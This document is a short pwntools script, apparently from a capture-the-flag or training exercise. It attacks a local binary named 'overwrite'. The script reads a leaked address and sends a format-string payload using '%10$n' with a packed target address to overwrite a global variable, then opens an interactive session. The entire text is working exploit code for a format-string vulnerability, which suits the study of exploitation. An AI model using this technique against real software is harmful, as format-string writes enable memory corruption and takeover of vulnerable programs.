from pwn import *

p = process("./overwrite")
elf = ELF("./overwrite")
gdb.attach(p,"b printf")

a_addr = int(p.recvuntil("\n",drop = True),16)
log.success("a_addr:" + hex(a_addr))
b_addr = 0x0804A028

payload = "aa" + "%10$n" + "b" + p32(b_addr)
p.sendline(payload)

info = p.recvline()
if "overwrite b for a small value" in info:
	log.success("overwrite b successfully")
p.interactive()
